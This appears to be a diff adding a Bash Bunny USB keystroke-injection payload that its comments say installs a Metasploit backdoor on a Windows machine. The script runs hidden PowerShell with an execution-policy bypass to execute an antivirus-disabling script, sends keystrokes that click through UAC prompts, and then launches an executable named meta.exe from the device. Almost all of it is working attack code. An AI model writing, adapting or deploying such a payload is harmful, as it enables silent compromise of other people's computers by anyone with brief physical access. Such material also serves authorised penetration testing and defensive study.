@@ -1,0 +1,38 @@
+#!/bin/bash
+#
+# runs a metasploit backdoor on Windows machine 
+#
+
+# Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# Normal Delay
+ND="2000"
+# Long Delay 
+LD="3500"
+
+LED ATTACK
+#Wait for the computer to recognize the drive etc
+Q DELAY $LD
+Q DELAY $LD
+Q DELAY $LD
+#Disable Windows Defender
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\disable-anti-virus.ps1')"
+#Bypass UAC
+Q DELAY $ND
+Q DELAY $ND
+Q LEFT
+Q ENTER
+#Run metasploit
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\meta.exe')"
+#Bypass UAC
+Q DELAY $ND
+Q DELAY $ND
+Q LEFT
+Q ENTER
+
+sync
+
+LED FINISH
